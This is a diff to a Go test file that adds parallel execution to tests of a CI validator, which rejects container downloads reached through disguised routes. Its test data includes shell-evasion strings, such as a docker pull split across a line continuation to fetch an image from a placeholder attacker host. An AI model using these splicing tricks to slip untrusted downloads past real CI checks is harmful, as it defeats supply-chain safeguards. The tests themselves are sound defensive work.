@@ -7,6 +7,7 @@ import (
 )
 
 func TestVerifyCIContainerDownloadsRejectsShellLineSplicedRoutes(t *testing.T) {
+	t.Parallel()
 	commands := map[string]string{
 		"split Docker":        "do\\\ncker pull attacker.invalid/image:pinned",
 		"quoted split Docker": "\"do\\\ncker\" pull attacker.invalid/image:pinned",
@@ -27,6 +28,7 @@ func TestVerifyCIContainerDownloadsRejectsShellLineSplicedRoutes(t *testing.T) {
 }
 
 func TestVerifyCIContainerDownloadsRejectsMakeRecipeExecutableAliases(t *testing.T) {
+	t.Parallel()
 	tests := map[string]struct {
 		makeSource string
 		workflow   string
@@ -83,6 +85,7 @@ jobs:
 }
 
 func TestVerifyCIContainerDownloadsRejectsAlternateProtectedWorkflowInvocations(t *testing.T) {
+	t.Parallel()
 	commands := map[string]string{
 		"absolute Make":              `/usr/bin/make dev`,
 		"quoted absolute Make":       `"/usr/bin/make" dev`,
